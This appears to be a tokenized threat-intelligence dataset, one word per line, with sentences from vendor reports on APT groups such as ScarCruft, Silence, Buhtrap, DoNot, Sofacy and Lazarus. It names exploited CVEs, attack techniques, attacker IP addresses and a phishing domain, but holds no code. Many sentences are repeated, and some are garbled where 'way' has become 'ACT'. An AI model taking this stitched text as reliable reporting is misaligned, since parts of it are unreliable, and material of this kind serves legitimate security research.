an
effort
to
demonstrate
it
wasn't
relegated
to
China
,
CrowdStrike
exposed
Clever
Kitten
,
an
actor
we
track
out
of
Iran
who
leverages
some
very
distinct
TTPs
when
viewed
next
to
a
more
visible
adversary
.
 
Next
,
in
an
effort
to
demonstrate
it
wasn't
relegated
to
China
,
we
exposed
Clever
Kitten
,
an
actor
we
track
out
of
Iran
who
leverages
some
very
distinct
TTPs
when
viewed
next
to
a
more
visible
adversary
.
 
Beginning
in
2009
,
we've
observed
this
actor
conduct
more
than
40
unique
campaigns
that
we've
identified
in
the
malware
configurations'
campaign
codes
.
 
These
codes
are
often
leveraged
in
the
malware
used
by
coordinated
targeted
attackers
to
differentiate
victims
that
were
successfully
compromised
from
different
target
sets
.
 
When
conducting
programmatic
espionage
activity
,
it
can
presumably
become
quite
confusing
if
the
attacker
targets
a
heavy
industry
company
,
an
avionics
program
,
and
seven
other
unique
targets
as
to
which
infected
host
you
will
collect
what
information
from
.
 
These
rules
detect
the
malware
"
beaconing
"
to
the
command-and-control
server
,
the
initial
malware
check-in
,
and
an
attempt
to
download
a
backdoor
module
.
 
Earlier
this
month
,
Securelist
's
technology
caught
another
zero-day
Adobe
Flash
Player
exploits
deployed
in
targeted
attacks
.
 
Securelist
believe
the
attacks
are
launched
by
an
APT
Group
we
track
under
the
codename
"
ScarCruft
"
.
 
ScarCruft
is
a
relatively
new
APT
group
;
victims
have
been
observed
in
Russia
,
Nepal
,
South
Korea
,
China
,
India
,
Kuwait
and
Romania
.
 
ScarCruft
has
several
ongoing
operations
,
utilizing
multiple
exploits
two
for
Adobe
Flash
and
one
for
Microsoft
Internet
Explorer
.
 
ScarCruft
is
a
relatively
new
APT
group
;
victims
have
been
observed
in
Russia
,
Nepal
,
South
Korea
,
China
,
India
,
Kuwait
and
Romania
.
 
Operation
Daybreak
appears
to
have
been
launched
by
ScarCruft
in
March
2016
and
employs
a
previously
unknown
(
0-day
)
Adobe
Flash
Player
exploit
.
 
Adobe
Flash
Player
exploit
.
 
It
is
also
possible
that
ScarCruft
deployed
another
zero
day
exploit
,
CVE-2016-0147
,
which
was
patched
in
April
.
 
Operation
Erebus
leverages
another
Flash
Player
exploit
(
CVE-2016-4117
)
through
the
use
of
watering
hole
attacks
.
 
ScarCruft
's
Operation
Erebus
leverages
another
Flash
Player
exploit
(
CVE-2016-4117
)
through
the
use
of
watering
hole
attacks
.
 
Nevertheless
,
resourceful
threat
actors
such
as
ScarCruft
will
probably
continue
to
deploy
zero-day
exploits
against
their
high
profile
targets
.
 
After
publishing
our
initial
series
of
blogposts
back
in
2016
,
Kaspersky
have
continued
to
track
the
ScarCruft
threat
actor
.
 
After
publishing
our
initial
series
of
blogposts
back
in
2016
,
we
have
continued
to
track
the
ScarCruft
threat
actor
.
 
ScarCruft
is
a
Korean-speaking
and
allegedly
state-sponsored
threat
actor
that
usually
targets
organizations
and
companies
with
links
to
the
Korean
peninsula
.
 
The
ScarCruft
group
uses
common
malware
delivery
techniques
such
as
spear
phishing
and
Strategic
Web
Compromises
(
SWC
)
.
 
ScarCruft
is
a
Korean-speaking
and
allegedly
state-sponsored
threat
actor
that
usually
targets
organizations
and
companies
with
links
to
the
Korean
peninsula
.
 
ScarCruft
uses
a
multi-stage
binary
infection
scheme
.
 
One
of
the
most
notable
functions
of
the
initial
dropper
is
to
bypass
Windows
UAC
(
User
Account
Control
)
in
order
to
execute
the
next
payload
with
higher
privileges
.
 
This
malware
uses
the
public
privilege
escalation
exploit
code
CVE-2018-8120
or
UACME
which
is
normally
used
by
legitimate
red
teams
.
 
Afterwards
,
the
installer
malware
creates
a
downloader
and
a
configuration
file
from
its
resource
and
executes
it
.
 
The
downloader
malware
uses
the
configuration
file
and
connects
to
the
C2
server
to
fetch
the
next
payload
.
 
The
ScarCruft
group
keeps
expanding
its
Exfiltration
targets
to
steal
further
information
from
infected
hosts
and
continues
to
create
tools
for
additional
data
Exfiltration
.
 
We
also
discovered
an
interesting
piece
of
rare
malware
created
by
this
threat
actor
a
Bluetooth
device
harvester
.
 
We
believe
they
may
have
some
links
to
North
Korea
,
which
may
explain
why
ScarCruft
decided
to
closely
monitor
them
.
 
ScarCruft
also
attacked
a
diplomatic
agency
in
Hong
Kong
,
and
another
diplomatic
agency
in
North
Korea
.
 
It
appears
ScarCruft
is
primarily
targeting
intelligence
for
political
and
diplomatic
purposes
.
 
ScarCruft
infected
this
victim
on
September
21
,
2018
.
 
But
before
the
ScarCruft
infection
,
however
,
another
APT
group
also
targeted
this
victim
with
the
host
being
infected
with
GreezeBackdoor
on
March
26
,
2018
.
 
ScarCruft
has
a
keen
interest
in
North
Korean
affairs
,
attacking
those
in
the
business
sector
who
may
have
any
connection
to
North
Korea
,
as
well
as
diplomatic
agencies
around
the
globe
.
 
Earlier
this
month
,
we
caught
another
zero-day
Adobe
Flash
Player
exploits
deployed
in
targeted
attacks
.
 
ScarCruft
is
a
relatively
new
APT
group
;
victims
have
been
observed
in
several
countries
,
including
Russia
,
Nepal
,
South
Korea
,
China
,
India
,
Kuwait
and
Romania
.
 
Currently
,
the
group
is
engaged
in
two
major
operations
:
Operation
Daybreak
and
Operation
Erebus
.
 
The
other
one
,
ScarCruft
's
Operation
Erebus
employs
an
older
exploit
,
for
CVE-2016-4117
and
leverages
watering
holes
.
 
The
other
one
,
"
Operation
Erebus
"
employs
an
older
exploit
,
for
CVE-2016-4117
and
leverages
watering
holes
.
 
We
will
publish
more
details
about
the
attack
once
Adobe
patches
the
vulnerability
,
which
should
be
on
June
16
.
 
The
ScarCruft
APT
gang
has
made
use
of
a
Flash
zero
day
patched
Thursday
by
Adobe
to
attack
more
than
two
dozen
high-profile
targets
in
Russia
and
Asia
primarily
.
 
Adobe
on
Thursday
patched
a
zero-day
vulnerability
in
Flash
Player
that
has
been
used
in
targeted
attacks
carried
out
by
a
new
APT
group
operating
primarily
against
high-profile
victims
in
Russia
and
Asia
.
 
Researchers
at
Kaspersky
Lab
privately
disclosed
the
flaw
to
Adobe
after
exploits
against
the
zero-day
were
used
in
March
by
the
ScarCruft
APT
gang
in
what
Kaspersky
Lab
is
calling
Operation
Daybreak
.
 
Kaspersky
speculates
that
ScarCruft
could
also
be
behind
another
zero-day
,
CVE-2016-0147
,
a
vulnerability
in
Microsoft
XML
Core
Services
that
was
patched
in
April
.
 
attacks
start
with
spear-phishing
emails
that
include
a
link
to
a
website
hosting
an
exploit
kit
associated
with
ScarCruft
and
used
in
other
attacks
.
 
Another
set
of
attacks
called
Operation
Erebus
leverages
another
flash
exploit
,
CVE-2016-4117
,
and
relies
on
watering
hole
attacks
as
a
means
of
propagation
.
 
Thursday
's
Flash
Player
update
patched
36
vulnerabilities
in
total
including
the
zero
day
CVE-2016-4171
.
 
The
ongoing
operation
likely
began
as
early
as
January
2017
and
has
continued
through
the
first
quarter
of
2019
.
 
Cisco
Talos
assess
with
high
confidence
that
these
operations
are
distinctly
different
and
independent
from
the
operations
performed
by
DNSpionage
,
which
we
reported
on
in
November
2018
.
 
We
assess
with
high
confidence
that
these
operations
are
distinctly
different
and
independent
from
the
operations
performed
by
DNSpionage
,
which
we
reported
on
in
November
2018
.
 
The
common
use
of
the
Enfal
Trojan
suggests
that
Shadow
Network
may
be
exchanging
tools
and
techniques
.
 
While
Silence
had
previously
targeted
Russian
banks
,
Group-IB
experts
also
have
discovered
evidence
of
the
group
's
activity
in
more
than
25
countries
worldwide
.
 
In
August
2017
,
the
National
Bank
of
Ukraine
warned
state-owned
and
private
banks
across
the
country
about
a
large-scale
phishing
attack
.
 
The
threat
actor
used
an
exploit
from
the
arsenal
of
the
state-sponsored
hacker
group
APT28
.
 
The
new
threat
actor
group
was
eventually
named
Silence
.
 
Silence
is
a
group
of
Russian-speaking
hackers
,
based
on
their
commands
language
,
the
location
of
infrastructure
they
used
,
and
the
geography
of
their
targets
(
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
,
and
Kazakhstan
)
.
 
Although
Silence
's
phishing
emails
were
also
sent
to
bank
employees
in
Central
and
Western
Europe
,
Africa
,
and
Asia
)
.
 
Silence
also
used
Russian-language
web
hosting
services
.
 
Financially
motivated
APT
groups
which
focus
efforts
on
targeted
attacks
on
the
financial
sector
such
as
Anunak
,
Corkow
,
Buhtrap
usually
managed
botnets
using
developed
or
modified
banking
Trojans
.
 
They
tried
new
techniques
to
steal
from
banking
systems
,
including
AWS
CBR
(
the
Russian
Central
Bank
's
Automated
Workstation
Client
)
,
ATMs
,
and
card
processing
.
 
Group-IB
researchers
were
tracking
Silence
throughout
this
period
and
conducting
response
following
incidents
in
the
financial
sector
.
 
Group-IB
detected
the
first
incidents
relating
to
Silence
in
June
2016
.
 
One
of
Silence
's
first
targets
was
a
Russian
bank
,
when
they
tried
to
attack
AWS
CBR
.
 
They
are
selective
in
their
attacks
and
wait
for
about
three
months
between
incidents
,
which
is
approximately
three
times
longer
than
other
financially
motivated
APT
groups
,
like
MoneyTaker
,
Anunak
(
Carbanak
)
,
Buhtrap
or
Cobalt
.
 
Silence
try
to
apply
new
techniques
and
ACTs
of
stealing
from
various
banking
systems
,
including
AWS
CBR
,
ATMs
,
and
card
processing
.
 
Silence
's
successful
attacks
currently
have
been
limited
to
the
CIS
and
Eastern
European
countries
.
 
He
is
responsible
for
developing
tools
for
conducting
attacks
and
is
also
able
to
modify
complex
exploits
and
third
party
software
.
 
Silence
's
main
targets
are
located
in
Russia
,
Ukraine
,
Belarus
,
Azerbaijan
,
Poland
,
and
Kazakhstan
.
 
However
,
some
phishing
emails
were
sent
to
bank
employees
in
more
than
25
countries
of
Central
and
Western
Europe
,
Africa
and
Asia
including
:
Kyrgyzstan
,
Armenia
,
Georgia
,
Serbia
,
Germany
,
Latvia
,
Czech
Republic
,
Romania
,
Kenya
,
Israel
,
Cyprus
,
Greece
,
Turkey
,
Taiwan
,
Malaysia
,
Switzerland
,
Vietnam
,
Austria
,
Uzbekistan
,
Great
Britain
,
Hong
Kong
,
and
others
.
 
In
the
same
year
,
they
conducted
DDoS
attacks
using
the
Perl
IRC
bot
and
public
IRC
chats
to
control
Trojans
.
 
In
the
same
year
,
Silence
conducted
DDoS
attacks
using
the
Perl
IRC
bot
and
public
IRC
chats
to
control
Trojans
.
 
In
two
months
,
the
group
returned
to
their
proven
method
and
withdrew
funds
again
through
ATMs
.
 
In
September
2017
,
we
discovered
a
new
targeted
attack
on
financial
institutions
.
 
In
September
2017
,
we
discovered
Silence
attack
on
financial
institutions
.
 
The
infection
vector
is
a
spear-phishing
email
with
a
malicious
attachment
.
 
An
interesting
point
in
the
Silence
attack
is
that
the
cybercriminals
had
already
compromised
banking
infrastructure
in
order
to
send
their
spear-phishing
emails
from
the
addresses
of
real
bank
employees
and
look
as
unsuspicious
as
possible
to
future
victims
.
 
The
spear-phishing
infection
vector
is
still
the
most
popular
ACT
to
initiate
targeted
campaigns
.
 
We
conclude
that
the
actor
behind
the
attack
is
Silence
group
,
a
relatively
new
threat
actor
that's
been
operating
since
mid-2016
.
 
A
preliminary
analysis
caught
the
attention
of
our
Threat
Analysis
and
Intelligence
team
as
it
yielded
interesting
data
that
,
among
other
things
,
shows
that
Silence
was
targeting
employees
from
financial
entities
,
specifically
in
the
Russian
Federation
and
the
Republic
of
Belarus
.
 
As
shown
above
,
the
threat
runs
several
native
binaries
to
collect
useful
information
for
its
recon
phase
.
 
The
intelligence
we
have
collected
shows
that
Silence
is
part
of
a
more
extensive
operation
,
still
focused
on
financial
institutions
operating
mainly
on
Russian
territory
.
 
These
spearphishing
attempts
represent
an
evolution
of
Iranian
actors
based
on
their
social
engineering
tactics
and
narrow
targeting
.
 
Based
on
file
modification
dates
and
timestamps
of
samples
,
it
appears
that
the
observed
campaign
was
initiated
in
the
middle
of
February
2016
,
with
the
infrastructure
taken
offline
at
the
start
of
March
.
 
While
the
Sima
moniker
could
similarly
originate
from
software
labels
,
it
is
a
common
female
Persian
name
and
a
Persian-language
Word
for
"
visage
"
or
"
appearance
"
.
 
Given
its
use
in
more
advanced
social
engineering
campaigns
against
women
's
rights
activists
,
the
label
seem
particularly
apt
.
 
Samples
and
resource
names
contained
the
family
names
of
prominent
Iranians
,
and
several
of
these
individuals
received
the
malware
located
in
their
respective
folder
.
 
The
Sima
group
also
engaged
in
impersonation
of
Citizenship
and
Immigration
Services
at
the
Department
of
Homeland
Security
,
posing
as
a
notice
about
the
expiration
of
the
recipient
's
Permanent
Residence
status
.
 
In
another
case
,
Sima
mirrored
an
announcement
made
about
the
broadcast
of
a
television
program
on
Iranian-American
cultural
affairs
in
order
to
impersonate
the
individual
and
engage
in
spearphishing
within
hours
of
the
legitimate
message
.
 
The
server
used
to
host
these
malware
samples
was
located
on
the
German
provider
Hetzner
(
148.251.55.114
)
,
within
a
small
block
of
IP
addresses
that
are
registered
with
the
customer
ID
"
HOS-156205
"
.
 
All
the
samples
appear
to
be
have
been
compiled
between
February
29
and
March
1
2016
,
shortly
before
our
discovery
,
suggesting
that
,
despite
the
known
C&C
servers
having
quickly
gone
offline
shortly
after
,
this
spree
of
attacks
might
be
fresh
and
currently
undergoing
.
 
These
archives
provide
further
indication
that
those
entities
behind
the
campaigns
are
Persian-language
speakers
,
due
to
the
naming
of
files
and
folders
in
Persian
.
 
For
the
sake
of
narrative
we
are
going
to
focus
exclusively
to
those
samples
we
identified
being
used
in
attacks
against
Iranian
civil
society
and
diaspora
.
 
Butterfly
has
attacked
multi-billion
dollar
companies
operating
in
the
internet
,
IT
software
,
pharmaceutical
,
and
commodities
sectors
.
 
The
first
signs
of
Butterfly
's
activities
emerged
in
early
2013
when
several
major
technology
and
internet
firms
were
compromised
.
 
However
,
an
investigation
by
Symantec
has
found
that
the
group
has
been
active
since
at
least
March
2012
and
its
attacks
have
not
only
continued
to
the
present
day
,
but
have
also
increased
in
number
.
 
Symantec
has
to
date
discovered
49
different
organizations
in
more
than
20
countries
that
have
been
attacked
by
Butterfly
.
 
Aside
from
the
four
companies
which
have
publicly
acknowledged
attacks
,
Symantec
has
identified
five
other
large
technology
firms
compromised
by
Butterfly
,
primarily
headquartered
in
the
US
.
 
In
the
first
attack
,
Butterfly
gained
a
foothold
by
first
attacking
a
small
European
office
belonging
to
one
firm
and
using
this
infection
to
then
move
on
to
its
US
office
and
European
headquarters
.
 
However
,
technology
is
not
the
only
sector
the
group
has
focused
on
and
Symantec
has
found
evidence
that
Butterfly
has
attacked
three
major
European
pharmaceutical
firms
.
 
Butterfly
has
also
shown
an
interest
in
the
commodities
sector
,
attacking
two
major
companies
involved
in
gold
and
oil
in
late
2014
.
 
The
company
specializes
in
finance
and
natural
resources
specific
to
that
region
.
 
The
latter
was
one
of
at
least
three
law
firms
Butterfly
has
targeted
over
the
past
three
years
.
 
In
many
attacks
,
the
group
has
succeeded
in
compromising
Microsoft
Exchange
or
Lotus
Domino
email
servers
in
order
to
intercept
company
emails
and
possibly
use
them
to
send
counterfeit
emails
.
 
A
powerful
threat
actor
known
as
"
Wild
Neutron
"
(
also
known
as
"
Jripbot
"
and
"
Morpho
"
)
has
been
active
since
at
least
2011
,
infecting
high
profile
companies
for
several
years
by
using
a
combination
of
exploits
,
watering
holes
and
multi-platform
malware
.
 
Based
on
the
profile
of
the
victims
and
the
type
of
information
targeted
by
the
attackers
,
Symantec
believes
that
Butterfly
is
financially
motivated
,
stealing
information
it
can
potentially
profit
from
.
 
Wild
Neutron
hit
the
spotlight
in
2013
,
when
it
successfully
infected
companies
such
as
Apple
,
Facebook
,
Twitter
and
Microsoft
.
 
Wild
Neutron
's
attacks
in
2015
uses
a
stolen
code
signing
certificate
belonging
to
Taiwanese
electronics
maker
Acer
and
an
unknown
Flash
Player
exploit
.
 
During
the
2013
attacks
,
the
Wild
Neutron
actor
successfully
compromised
and
leveraged
the
website
www.iphonedevsdk.com
,
which
is
an
iPhone
developers
forum
.
 
Wild
Neutron
's
attack
took
advantage
of
a
Java
zero-day
exploit
and
used
hacked
forums
as
watering
holes
.
 
While
the
group
used
watering
hole
attacks
in
2013
,
it's
still
unclear
how
victims
get
redirected
to
the
exploitation
kits
in
the
new
2014-2015
attacks
.
 
Wild
Neutron
's
tools
include
a
password
harvesting
trojan
,
a
reverse-shell
backdoor
and
customized
implementations
of
OpenSSH
,
WMIC
and
SMB
.
 
Instead
of
Flash
exploits
,
older
Wild
Neutron
exploitation
and
watering
holes
used
what
was
a
Java
zero-day
at
the
end
of
2012
and
the
beginning
of
2013
,
detected
by
Kaspersky
Lab
products
as
Exploit.Java.CVE-2012-3213.b
.
 
The
victims
for
the
2014-2015
versions
are
generally
IT
and
real
estate/investment
companies
and
in
both
cases
,
a
small
number
of
computers
have
been
infected
throughout
Wild
Neutron
.
 
Wild
Neutron
's
targeting
of
major
IT
companies
,
spyware
developers
(
FlexiSPY
)
,
jihadist
forums
(
the
"
Ansar
Al-Mujahideen
English
Forum
"
)
and
Bitcoin
companies
indicate
a
flexible
yet
unusual
mindset
and
interests
.
 
We
continue
to
track
the
Wild
Neutron
group
,
which
is
still
active
as
of
June
2015
.
 
A
ransomware
variant
dubbed
PyLocky
was
observed
in
September
2018
being
distributed
by
a
phishing
campaign
using
an
invoicing
theme
.
 
PyLocky
was
found
to
be
targeting
entities
in
France
and
Germany
.
 
Fxmsp
specialize
in
breaching
highly
secure
protected
networks
to
access
private
corporate
and
government
information
.
 
Fxmsp
is
a
hacking
collective
that
has
operated
in
various
top-tier
Russian-
and
English-speaking
underground
communities
since
2017
.
 
Throughout
2017
and
2018
,
Fxmsp
established
a
network
of
trusted
proxy
resellers
to
promote
their
breaches
on
the
criminal
underground
.
 
On
April
24
,
2019
,
Fxmsp
claimed
to
have
secured
access
to
three
leading
antivirus
companies
.
 
According
to
the
Fxmsp
,
they
worked
tirelessly
for
the
first
quarter
of
2019
to
breach
these
companies
and
finally
succeeded
and
obtained
access
to
the
companies'
internal
networks
.
 
Booz
Allen
Hamilton
in
2014
and
AhnLab
in
2015
reported
on
Bisonal
using
a
simple
XOR
cipher
to
hide
the
C2
address
strings
in
the
body
.
 
For
example
,
Bisonal
malware
in
2012
used
send()
and
recv()
APIs
to
communicate
with
its
C2.
This
Bisonal
variant
used
in
the
latest
attack
communicates
with
one
of
the
following
hard-coded
C2
addresses
by
using
the
HTTP
POST
method
on
TCP
PROT
443
.
 
Previous
reports
have
discussed
Bisonal
malware
used
in
attacks
against
Japan
,
South
Korea
and
Russia
.
 
This
particular
sample
we
found
targeted
an
organization
in
Russia
and
there
is
a
specific
system
language
check
for
Cyrillic
and
no
others
.
 
If
it's
Cyrillic
and
the
command
to
the
shell
is
not
ipconfig
,
the
threat
converts
the
command
result
text
encoding
from
Cyrillic
to
UTF-16
.
 
Similar
to
the
Bisonal
variant
targeting
the
Russian
organization
,
this
sample
was
also
disguised
as
PDF
document
.
 
The
installed
EXE
file
is
almost
exactly
the
same
as
the
DLL
version
of
Bisonal
variant
used
against
the
Russian
organization
.
 
The
targets
are
military
or
defense
industry
in
particular
countries
,
it
used
DDNS
for
C2
servers
,
and
tracked
connections
from
their
victims
by
using
target
or
campaign
codes
,
as
well
as
disguising
the
malware
as
document
file
,
and
using
a
dropper
to
install
the
malware
and
decoy
file
.
 
A
previous
campaign
of
this
APT
group
was
uncovered
by
Talos
in
June
2017
,
and
since
then
very
little
of
this
operation
was
seen
in
the
wild
.
 
ined
in
the
archive
is
called
DriverInstallerU.exe
but
its
metadata
shows
that
its
original
name
is
Interenet
Assistant.exe
.
 
After
reviewing
all
the
malware
functionalities
,
we
are
confident
in
saying
that
the
attackers
look
for
victims
who
answer
well-defined
characteristics
and
believe
that
further
stages
of
the
attack
are
delivered
only
to
those
who
fit
the
specific
victim
profile
.
 
In
this
sample
,
however
,
the
module
names
were
changed
from
actors
and
characters
names
to
car
models
,
namely
BMW_x1
,
BMW_x2
and
up
to
BMW_x8
.
 
But
,
thanks
to
the
attackers
known
affection
for
decoy
documents
that
pose
as
news
summaries
,
we
were
able
to
date
the
campaign
back
to
March
2018
.
 
With
the
experience
gained
from
the
APT
attack
that
began
in
March
2017
,
it
seems
this
campaign
has
evolved
into
an
attack
with
new
capabilities
,
and
an
even
more
specific
target
,
over
a
year
later
.
 
These
unknown
actors
continued
launching
DDoS
attacks
over
the
next
few
years
.
 
For
simplicity
,
Kaspersky
is
calling
them
the
BlackEnergy
APT
group
.
 
Since
the
middle
of
2015
,
one
of
the
preferred
attack
vectors
for
BlackEnergy
in
Ukraine
has
been
Excel
documents
with
macros
that
drop
the
Trojan
to
disk
if
the
user
chooses
to
run
the
script
in
the
document
.
 
A
very
good
analysis
and
overview
of
the
BlackEnergy
attacks
in
Ukraine
throughout
2014
and
2015
was
published
by
the
Ukrainian
security
firm
Cys
Centrum
the
text
is
only
available
in
Russian
for
now
,
but
can
be
read
via
Google
Translate
.
 
The
earliest
signs
of
destructive
payloads
with
BlackEnergy
go
back
as
far
as
June
2014
.
 
BlackEnergy
is
a
highly
dynamic
threat
actor
and
the
current
attacks
in
Ukraine
indicate
that
destructive
actions
are
on
their
main
agenda
,
in
addition
to
compromising
industrial
control
installations
and
espionage
activities
.
 
Kaspersky
will
continue
to
monitor
the
BlackEnergy
attacks
in
Ukraine
and
update
our
readers
with
more
data
when
available
.
 
From
Buhtrap
perpetrating
cybercrime
for
financial
gain
,
its
toolset
has
been
expanded
with
malware
used
to
conduct
espionage
in
Eastern
Europe
and
Central
Asia
.
 
Throughout
our
tracking
,
we've
seen
this
group
deploy
its
main
backdoor
as
well
as
other
tools
against
various
victims
,
but
June
2019
was
the
first
time
we
saw
the
Buhtrap
group
use
a
zero-day
exploit
as
part
of
a
campaign
.
 
In
that
case
,
we
observed
Buhtrap
using
a
local
privilege
escalation
exploit
,
CVE-2019-1132
,
against
one
of
its
victims
.
 
However
,
as
the
shift
in
targets
occurred
before
the
source
code
leak
,
we
assess
with
high
confidence
that
the
same
people
behind
the
first
Buhtrap
malware
attacks
against
businesses
and
banks
are
also
involved
in
targeting
governmental
institutions
.
 
When
Buhtrap
was
targeting
businesses
,
the
decoy
documents
would
typically
be
contracts
or
invoices
.
 
The
Buhtrap
group
is
well
known
for
its
targeting
of
financial
institutions
and
businesses
in
Russia
.
 
Figure
2
is
a
typical
example
of
a
generic
invoice
the
group
used
in
a
campaign
in
2014
.
 
When
the
group's
focus
shifted
to
banks
,
the
decoy
documents
were
related
to
banking
system
regulations
or
advisories
from
FinCERT
,
an
organization
created
by
the
Russian
government
to
provide
help
and
guidance
to
its
financial
institutions
.
 
We
confirmed
that
this
is
a
DarkHydrus
Group's
new
attack
targeting
Middle
East
region
.
 
In
July
2018
,
Palo
Alto
disclosed
DarkHydrus
Group
which
showed
its
special
interest
to
governments
in
Middle
East
.
 
Prior
to
that
report
,
we
published
detail
analysis
on
malware
exploiting
CVE-2018-8414
vulnerability
(remote
code
execution
in
SettingContent-ms)
,
which
is
believed
a
work
of
DarkHydrus
.
 
However
,
the
final
payload
is
something
that
welivesecurity
have
never
seen
associated
with
Buhtrap
.
 
It's
coincident
that
both
'darkhydrus'
APT
group
name
and
Williams
user
name
in
PDB
path
found
in
this
Twitter
user
.
 
In
recent
APT
incidents
,
Dark
Hydruns
tend
to
adopt
Office
VBA
macro
instead
of
Office
0day
vulnerability
in
the
consideration
of
cost
reduction
.
 
ASERT
uncovered
a
credential
theft
campaign
we
call
LUCKY
ELEPHANT
where
attackers
masquerade
as
legitimate
entities
such
as
foreign
government
,
telecommunications
,
and
military
.
 
From
at
least
February
2019
to
present
,
the
actors
in
the
LUCKY
ELEPHANT
campaign
copied
webpages
to
mimic
South
Asian
government
websites
as
well
as
Microsoft
Outlook
365
login
pages
and
hosted
them
on
their
own
doppelganger
domains
,
presumably
to
trick
victims
into
providing
login
credentials
.
 
ASERT
suspects
that
the
Actors
use
phishing
emails
to
lure
victims
to
the
doppelganger
websites
and
entice
users
to
enter
their
credentials
.
 
It
is
important
to
note
that
one
domain
,
yahoomail[.]cf
is
only
associated
with
this
group
from
February
2019
onward
.
 
In
late
2018
,
the
domain
was
associated
with
a
different
APT
group
/
campaign
of
Chinese
origin
.
 
Based
on
our
analysis
into
the
activity
,
ASERT
deems
with
moderate
confidence
that
an
Indian
APT
group
is
behind
the
LUCKY
ELEPHANT
campaign
.
 
The
targets
are
typical
of
known
Indian
APT
activity
and
the
infrastructure
was
previously
used
by
an
Indian
APT
group
.
 
DoNot
Team
has
a
history
of
heavily
targeting
Pakistan
,
in
addition
to
other
neighboring
countries
.
 
The
360
Intelligence
Center
observed
four
distinct
campaigns
against
Pakistan
since
2017
(link)
,
recently
targeting
Pakistani
businessmen
working
in
China
.
 
DoNot
Teams
confirmed
use
of
this
IP
dates
back
to
September
2018
,
with
a
six-month
gap
until
it
was
used
to
host
doppelganger
domains
for
the
LUCKY
ELEPHANT
campaign
in
early
February
.
 
One
of
the
IP
addresses
,
128.127.105.13
,
was
previously
used
by
the
DoNot
Team
(aka
APT-C-35
)
,
a
suspected
Indian
APT
group
.
 
The
actors
behind
LUCKY
ELEPHANT
recognize
the
effectiveness
and
use
doppelganger
webpages
nearly
identical
to
legitimate
sites
,
enticing
users
to
input
their
credentials
.
 
The
heavier
targeting
in
Pakistan
adheres
to
historical
targeting
and
the
ongoing
tension
between
the
two
countries
,
which
has
escalated
since
a
terrorist
attack
in
Kashmir
on
14
February
2019
.
 
The
targeting
of
Pakistan
,
Bangladesh
,
Sri
Lanka
,
Maldives
,
Myanmar
,
Nepal
,
and
the
Shanghai
Cooperation
Organization
are
all
historical
espionage
targets
by
India
.
 
However
,
it
is
clear
is
that
Donot
are
actively
establishing
infrastructure
and
are
targeting
governments
in
South
Asia
.
 
First
attack
of
this
campaign
took
place
in
May
2018
.
 
Arbor
also
published
APT
research
on
this
group
,
and
named
it
Donot
.
 
Donot
attacked
government
agencies
,
aiming
for
classified
intelligence
.
 
We
identified
this
APT
group
coded
as
APT-C-35
in
2017
,
who
is
mainly
targeting
Pakistan
and
other
South
Asian
countries
for
Cyber
Espionage
.
 
At
least
4
attack
campaigns
against
Pakistan
have
been
observed
by
us
since
2017
.
 
Spear
phishing
emails
with
vulnerable
Office
documents
or
malicious
macros
are
sent
to
victims
.
 
In
the
latest
attack
,
Donot
group
is
targeting
Pakistani
businessman
working
in
China
.
 
Two
unique
malware
frameworks
,
EHDevel
and
yty
,
are
developed
by
attackers
.
 
wuaupdt.exe
is
a
CMD
backdoor
,
which
can
receive
and
execute
CMD
commands
sent
from
C2
.
 
Furthermore
,
it
has
similar
code
logic
as
previous
ones
wuaupdt.exe
in
this
attack
appears
in
previous
Donot
attack
,
and
C2
addresses
are
same
to
previous
ones
.
 
From
the
attack
activity
captured
this
time
,
it
is
obvious
that
Donot
APT
group
is
still
keen
on
Pakistan
as
primary
target
of
attack
,
and
even
expands
scope
of
attack
to
include
Pakistani
staffs
and
institutions
in
China
.
 
Buhtrap
still
make
extensive
use
of
NSIS
installers
as
droppers
and
these
are
mainly
delivered
through
malicious
documents
.
 
They
first
came
to
light
in
2016
,
when
they
managed
to
steal
sensitive
information
from
the
US
Democratic
National
Committee
(DNC)
.
 
Earworm
first
came
to
light
in
2016
,
when
they
managed
to
steal
sensitive
information
from
the
US
Democratic
National
Committee
(DNC)
.
 
They
were
also
behind
an
attack
on
the
World
Anti-Doping
Agency
(WADA)
,
in
which
they
leaked
confidential
information
about
several
drug
tests
.
 
SPLM
,
GAMEFISH
,
and
Zebrocy
delivery
all
maintain
their
own
clusters
,
but
frequently
overlap
later
.
 
Our
previous
post
on
Sofacy's
2017
activity
stepped
aACT
from
the
previously
covered
headline
buzz
presenting
their
association
with
previously
known
political
hacks
and
interest
in
Europe
and
the
US
,
and
examines
their
under-reported
ongoing
activity
in
middle
east
,
central
asia
,
and
now
a
shift
in
targeting
further
east
,
including
China
,
along
with
an
overlap
surprise
.
 
The
larger
,
300kb+
SPLM
backdoors
deployed
in
2016
and
2017
are
not
observed
any
longer
at
targets
in
2018
.
 
A
previous
,
removed
,
report
from
another
vendor
claimed
non-specific
information
about
the
groups'
interest
in
Chinese
universities
,
but
that
report
has
been
removed
most
likely
detections
were
related
to
students
and
researchers
scanning
known
collected
samples
and
any
incidents
remain
unconfirmed
and
unknown
.
 
Either
ACT
,
the
group's
consistent
activity
throughout
central
and
eastern
asia
seems
to
be
poorly
represented
in
the
public
discussion
.
 
The
actors
behind
this
campaign
we
call
LUCKY
ELEPHANT
use
doppelganger
webpages
to
mimic
legitimate
entities
such
as
foreign
governments
,
telecommunications
,
and
military
.
 
Currently
,
Sofacy
targets
large
air-defense
related
commercial
organizations
in
China
with
SPLM
,
and
moves
Zebrocy
focus
across
Armenia
,
Turkey
,
Kazahkstan
,
Tajikistan
,
Afghanistan
,
Mongolia
,
China
,
and
Japan
.
 
Either
ACT
,
Sofacy's
consistent
activity
throughout
central
and
eastern
asia
seems
to
be
poorly
represented
in
the
public
discussion
.
 
According
to
this
new
alert
,
Hidden
Cobra
the
U.S.
governments
code
name
for
Lazarus
has
been
conducting
FASTCash
attacks
stealing
money
from
Automated
Teller
Machines
(ATMs)
from
banks
in
Asia
and
Africa
since
at
least
2016
.
 
Lazarus
is
a
very
active
attack
group
involved
in
both
cyber
crime
and
espionage
.
 
The
group
was
initially
known
for
its
espionage
operations
and
a
number
of
high-profile
disruptive
attacks
,
including
the
2014
attack
on
Sony
Pictures
.
 
Following
US-CERTs
report
,
Symantec's
research
uncovered
the
key
component
used
in
Lazarus's
recent
wave
of
financial
attacks
.
 
More
recently
,
Lazarus
has
also
become
involved
in
financially
motivated
attacks
,
including
an
US$81
million
dollar
theft
from
the
Bangladesh
Central
Bank
and
the
WannaCry
ransomware
.
 
Other
open
source
and
semi-legitimate
pen-testing
tools
like
nbtscan
and
powercat
are
being
used
